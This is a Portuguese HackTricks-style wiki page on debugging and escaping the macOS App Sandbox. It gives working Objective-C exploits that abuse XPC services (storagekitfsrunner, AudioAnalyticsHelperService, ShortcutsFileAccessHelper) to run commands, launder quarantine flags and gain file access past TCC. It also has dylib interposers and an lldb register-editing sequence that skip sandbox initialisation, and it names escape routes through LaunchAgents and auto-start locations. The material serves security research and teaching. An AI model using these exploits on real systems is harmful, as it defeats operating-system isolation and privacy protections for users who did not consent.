# Debug e Bypass do macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Processo de carregamento do Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Imagem de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na imagem anterior, é possível observar **como o sandbox será carregado** quando uma aplicação com o entitlement **`com.apple.security.app-sandbox`** for executada.

O compilador vinculará `/usr/lib/libSystem.B.dylib` ao binário.

Em seguida, **`libSystem.B`** chama várias funções até que **`xpc_pipe_routine`** envie os entitlements da aplicação para o **`securityd`**. O Securityd verifica se o processo deve ser colocado em quarentena dentro do sandbox e, se for o caso, coloca-o em quarentena.\
Por fim, o sandbox é ativado com uma chamada para **`__sandbox_ms`**, que chama **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Possíveis Bypasses

### Bypass do atributo de quarentena

**Arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para impedir escapes do sandbox: se você soltar uma nova aplicação e tentar executá-la, a flag de quarentena a interromperá. Portanto, **se você conseguir soltar um arquivo ou diretório *sem* o atributo de quarentena, poderá escapar do App Sandbox** — basta soltar um bundle `.app` e executá-lo com `open`, pois o processo recém-iniciado será executado sob o LaunchServices e não sob o seu sandbox.

A maneira confiável de obter um **drop sem quarentena** é solicitar que **outro processo crie o arquivo para você**. Conforme documentado em [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) por Mickey Jin, o **App Sandbox** marca os arquivos soltos com quarentena, mas os serviços XPC executados sob o Service Sandbox **não**. Portanto, vários serviços XPC não autenticados poderiam ser usados como uma primitiva de "lavagem de quarentena":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) e **CVE-2023-32414** (`ArchiveService`): extraem um arquivo passado por uma aplicação em sandbox para um local escolhido **sem propagar o xattr de quarentena** para o conteúdo extraído.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): o path traversal em `submitSignpostDataWithConfig:` permitia criar **diretórios arbitrários sem quarentena**, o que é suficiente para criar toda a estrutura de um bundle `.app` fora do container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): anexa uma DMG em quarentena **sem colocar o dispositivo resultante em quarentena**, permitindo executar as aplicações no volume montado.

> [!TIP]
> A extração geralmente **remove o bit de permissão de execução**. O workaround usado no CVE-2023-27944 consistia em colocar um **symlink** para um binário de sistema assinado existente (por exemplo, `/System/Library/CoreServices/Automator Application Stub`) como o executável principal do bundle, mantendo-o executável sem a necessidade de `+x` em um arquivo solto.

> [!CAUTION]
> Isso funciona porque a verificação é orientada pela **flag do item que está sendo executado**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, e somente então *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Nenhuma flag no bundle que você executa significa nenhuma verificação do Gatekeeper — exatamente a primitiva fornecida pelos CVEs acima.<sup>[[5]](#references)</sup>
>
> Observe que, se um bundle `.app` já tiver sido autorizado a ser executado (ele tiver um xattr de quarentena com a flag "authorized to run" ativada), você também poderia abusar dele... exceto que agora não é possível escrever dentro de bundles **`.app`** a menos que você tenha algumas permissões privilegiadas de TCC (o que você não terá dentro de um sandbox).

### Abusando da funcionalidade Open

Nos [**últimos exemplos de bypass do Word sandbox**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), é possível observar como a funcionalidade de CLI **`open`** poderia ser abusada para realizar o bypass do sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Mesmo que uma aplicação **tenha a finalidade de ser executada em sandbox** (`com.apple.security.app-sandbox`), é possível realizar o bypass do sandbox se ela for **executada a partir de um LaunchAgent** (`~/Library/LaunchAgents`), por exemplo.\
Conforme explicado [**nesta publicação**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), se você quiser obter persistência com uma aplicação em sandbox, poderá fazer com que ela seja executada automaticamente como um LaunchAgent e talvez injetar código malicioso por meio de variáveis de ambiente do DyLib.<sup>[[6]](#references)</sup>

### Abusando de locais de inicialização automática

Se um processo em sandbox puder **escrever** em um local onde **posteriormente uma aplicação fora do sandbox executará o binário**, ele poderá **escapar simplesmente colocando** o binário nesse local. Bons exemplos desse tipo de local são `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.

Para isso, talvez você precise de **2 etapas**: fazer com que um processo com um **sandbox mais permissivo** (`file-read*`, `file-write*`) execute o seu código, que então escreverá em um local onde será **executado fora do sandbox**.

Consulte esta página sobre **locais de inicialização automática**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusando de outros processos

Se, a partir do processo em sandbox, você conseguir **comprometer outros processos** executados em sandboxes menos restritivos (ou em nenhum sandbox), poderá escapar para os respectivos sandboxes:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Serviços Mach de sistema e de usuário disponíveis

O sandbox também permite a comunicação com determinados **serviços Mach** via XPC, definidos no perfil `application.sb`. Se você conseguir **abusar** de um desses serviços, poderá conseguir **escapar do sandbox**.

Conforme indicado [neste writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), as informações sobre os serviços Mach são armazenadas em `/System/Library/xpc/launchd.plist`. É possível encontrar todos os serviços Mach de sistema e de usuário pesquisando nesse arquivo por `<string>System</string>` e `<string>User</string>`.<sup>[[4]](#references)</sup>

Além disso, é possível verificar se um serviço Mach está disponível para uma aplicação em sandbox chamando `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Serviços Mach PID disponíveis

Esses serviços Mach foram inicialmente abusados para [escapar do sandbox neste writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Naquela época, **todos os serviços XPC necessários** por um aplicativo e seu framework eram visíveis no domínio PID do aplicativo (são serviços Mach com `ServiceType` como `Application`).<sup>[[4]](#references)</sup>

Para **entrar em contato com um serviço XPC do PID Domain**, basta registrá-lo dentro do aplicativo com uma linha como:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Além disso, é possível encontrar todos os serviços Mach de **Application** pesquisando por `<string>Application</string>` dentro de `System/Library/xpc/launchd.plist`.

Outra maneira de encontrar xpc services válidos é verificar os que estão em:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Vários exemplos explorando esta técnica podem ser encontrados no [**writeup original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/); no entanto, os exemplos a seguir são alguns exemplos resumidos.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Este serviço permite todas as conexões XPC ao retornar sempre `YES`, e o método `runTask:arguments:withReply:` executa um comando arbitrário com parâmetros arbitrários.

O exploit era "tão simples quanto":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Este XPC service permitia qualquer cliente ao sempre retornar `YES`, e o método `createZipAtPath:hourThreshold:withReply:` aceitava o caminho para uma pasta e a compactava em um arquivo ZIP.

Portanto, era possível gerar uma estrutura de pasta de aplicativo falsa, compactá-la, depois descompactá-la e executá-la para escapar do sandbox, pois os novos arquivos não teriam o atributo de quarentena.

O exploit era:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Este XPC service permite conceder acesso de leitura e escrita a uma URL arbitrária ao cliente XPC por meio do método `extendAccessToURL:completion:`, que aceitava qualquer conexão. Como o XPC service tem FDA, é possível abusar dessas permissões para ignorar completamente o TCC.

O exploit consistia em:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Compilação estática e linking dinâmico

[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de ignorar o Sandbox. Como o sandbox é aplicado a partir do userland quando a biblioteca **libSystem** é carregada. Se um binário pudesse evitar carregá-la, ele nunca seria colocado no sandbox:<sup>[[2]](#references)</sup>

- Se o binário fosse **completamente compilado estaticamente**, poderia evitar carregar essa biblioteca.
- Se o **binário não precisasse carregar nenhuma biblioteca** (porque o linker também está em libSystem), não precisaria carregar libSystem.

### Shellcodes

Observe que **até mesmo shellcodes** em ARM64 precisam ser vinculados a `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Restrições não herdadas

Conforme explicado no **[bônus deste writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, uma restrição do sandbox como:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
pode ser contornado por um novo processo executando, por exemplo:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
No entanto, é claro, esse novo processo não herdará entitlements ou privilégios do processo pai.

### Entitlements

Observe que, mesmo que algumas **ações** possam ser **permitidas pelo sandbox** se um aplicativo tiver um **entitlement** específico, como em:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Bypass de Interposting

Para mais informações sobre **Interposting**, consulte:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Fazer Interpost de `_libsecinit_initializer` para impedir o sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` para impedir o Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Depurar e contornar o Sandbox com lldb

Vamos compilar uma aplicação que deve estar em sandbox:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Em seguida, compile o app:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, o que o **Sandbox não permitirá**.\
> Crie um arquivo nesse local, pois, assim que o Sandbox for bypassed, ele poderá lê-lo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Vamos depurar o aplicativo para verificar quando o Sandbox é carregado:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Mesmo com o Sandbox bypassado, o TCC** perguntará ao usuário se ele deseja permitir que o processo leia arquivos da área de trabalho

## References

- [1] [Jonathan Levin - O Apple Sandbox: uma análise mais aprofundada do Quagmire (slides do HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Escape do Sandbox da Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - O Apple Sandbox: uma análise mais aprofundada do Quagmire (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Uma Nova Era dos Escapes do macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explicação: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
